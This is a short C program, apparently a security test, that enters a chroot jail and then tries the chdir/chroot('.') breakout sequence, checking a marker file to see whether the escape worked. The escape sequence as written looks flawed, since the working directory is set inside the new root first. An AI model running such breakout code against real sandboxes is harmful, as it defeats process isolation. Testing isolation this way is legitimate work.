#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

int main() {
    printf("Starting chroot escape test\n");
    
    // Create marker file
    system("touch /ESCAPE_TEST_MARKER");
    printf("Created marker file outside jail\n");
    
    // Setup the jail
    system("mkdir -p /tmp/jail-test/pwn");
    printf("Set up jail at /tmp/jail-test with /pwn directory\n");
    
    // Enter the jail
    printf("Entering jail...\n");
    if (chroot("/tmp/jail-test") != 0) {
        perror("chroot failed");
        return 1;
    }
    printf("Successfully entered jail\n");
    
    // Try to access marker before escape (should fail)
    printf("Trying to access marker before escape: ");
    system("cat /ESCAPE_TEST_MARKER 2>&1");
    
    // Start escape sequence
    printf("\nStarting escape sequence...\n");
    printf("1. Changing to /pwn directory\n");
    chdir("/pwn");
    
    printf("2. Calling chroot(.)\n");
    if (chroot(".") != 0) {
        perror("First chroot(\".\") failed");
        return 1;
    }
    
    printf("3. Calling chdir(\"..\")\n");
    chdir("..");
    
    printf("4. Calling final chroot(.)\n");
    if (chroot(".") != 0) {
        perror("Second chroot(\".\") failed");
        return 1;
    }
    
    printf("\nAfter escape attempt:\n");
    printf("Current working directory: ");
    system("pwd");
    
    // Try to access marker after escape (should succeed if escape worked)
    printf("Trying to access marker after escape: ");
    system("cat /ESCAPE_TEST_MARKER 2>&1");
    
    return 0;
}
